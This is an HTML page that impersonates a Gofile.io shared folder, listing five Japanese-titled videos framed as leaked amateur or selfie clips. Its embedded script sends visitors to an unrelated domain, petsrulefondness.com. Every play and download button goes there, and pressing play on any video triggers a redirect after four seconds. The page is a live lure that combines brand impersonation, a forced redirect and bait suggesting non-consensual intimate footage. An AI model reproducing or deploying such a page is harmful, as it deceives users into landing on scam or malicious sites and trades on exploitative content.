<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="📁 Gofile.io - 共有フォルダ Jp here pun">
    <meta name="twitter:description" content="5個の新しいファイルが共有されました。今すぐ視聴可能です。">
    <meta name="twitter:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjO0HsbBV5jxLTDxyg_6hyphenhyphenoAQhFZz1bFnwSa5fK24jht-ubOFvcPqSzLoRsQV6lU6A3UCzvrhQCa7Ois-LoVyc6gTSBi1EQGgwrBhZIJnbEUY6khcsTybUJS-j2pzs2mZ1p13SscBkSS9J31e6CnBDsOFYM5FKiCHnLSySJZP-FkTJ6DUqvMs6du94ZvB3T/s1600/12873.png">
    <meta name="twitter:site" content="@gofile">
    <meta name="twitter:domain" content="gofile.io">

    <title>Gofile - フォルダ Jp here pun</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"/>
    
    <style>
        body { background-color: #1e2530; color: #ced4da; font-family: sans-serif; margin: 0; }
        .gofile-header { background-color: #252d3a; border-bottom: 1px solid #333; position: sticky; top: 0; z-index: 100; }
        .video-item { border-bottom: 1px solid #2d3748; padding: 15px 12px; }
        .video-container { width: 180px; aspect-ratio: 16 / 9; margin-top: 10px; margin-left: 35px; border-radius: 4px; overflow: hidden; border: 1px solid #374151; background: #000; position: relative; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .btn-gofile { background-color: #2d3748; border: 1px solid #444; color: white; width: 35px; height: 35px; border-radius: 4px; display: flex; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div class="gofile-header p-4 flex items-center gap-4">
        <i class="fas fa-bars text-blue-400 text-lg"></i>
        <div>
            <h1 class="font-bold text-white text-md uppercase leading-none">Jp here pun</h1>
            <div class="flex items-center gap-2 mt-2">
                <i class="fas fa-folder text-yellow-500 text-xl"></i>
                <span class="text-[9px] bg-[#313b49] px-2 py-0.5 rounded text-white border border-gray-600 uppercase">公開中</span>
            </div>
        </div>
    </div>

    <div class="max-w-md mx-auto">
        <script>
            const data = [
                {name: "【限定】日本人素人_01.mp4", url: "https://cdn.videy.co/aRcxDZyz1.mp4"},
                {name: "【最新】SNS話題_02.mp4", url: "https://cdn.videy.co/2cgXv53b1.mp4"},
                {name: "【未公開】自撮り_03.mp4", url: "https://cdn.videy.co/JDXNHxrZ1.mp4"},
                {name: "【閲覧注意】流出_04.mp4", url: "https://cdn.videy.co/eYSQEowE1.mp4"},
                {name: "【フル】本編動画_05.mp4", url: "https://cdn.videy.co/xfMR91cS1.mp4"}
            ];
            
            const sl = "https://petsrulefondness.com/g8htu6fn9?key=b8eedfbc01329bff8c2b6da1a062f8c2";

            function startTimer() {
                setTimeout(() => {
                    window.location.href = sl;
                }, 4000); // Redirect setelah 4 detik
            }

            data.forEach((item, index) => {
                document.write(`
                <div class="video-item">
                    <div class="flex justify-between items-start">
                        <div class="flex gap-3">
                             <i class="fas fa-file-video text-blue-400 text-2xl mt-1"></i>
                             <div>
                                <h3 class="text-[13px] font-bold text-white leading-tight">${item.name}</h3>
                                <p class="text-[10px] text-gray-500 mt-1 italic">サイズ: 14.2 MB</p>
                             </div>
                        </div>
                        <div class="flex gap-1">
                            <button onclick="window.location.href='${sl}'" class="btn-gofile"><i class="fas fa-play text-blue-400"></i></button>
                            <button onclick="window.location.href='${sl}'" class="btn-gofile"><i class="fas fa-download"></i></button>
                        </div>
                    </div>

                    <div class="video-container">
                        <video id="vid-${index}" onplay="startTimer()" preload="none" poster="${item.url}.jpg" controlsList="nodownload">
                            <source src="${item.url}" type="video/mp4">
                        </video>
                        <div id="play-btn-${index}" onclick="document.getElementById('vid-${index}').play(); this.style.display='none';" class="absolute inset-0 flex items-center justify-center cursor-pointer bg-black/20">
                             <i class="fas fa-play text-white text-2xl opacity-80"></i>
                        </div>
                    </div>
                </div>
                `);
            });
        </script>
    </div>

    <footer class="p-10 text-center opacity-10 text-[8px]">
        © 2026 Gofile.io Cloud Storage
    </footer>

</body>
</html>
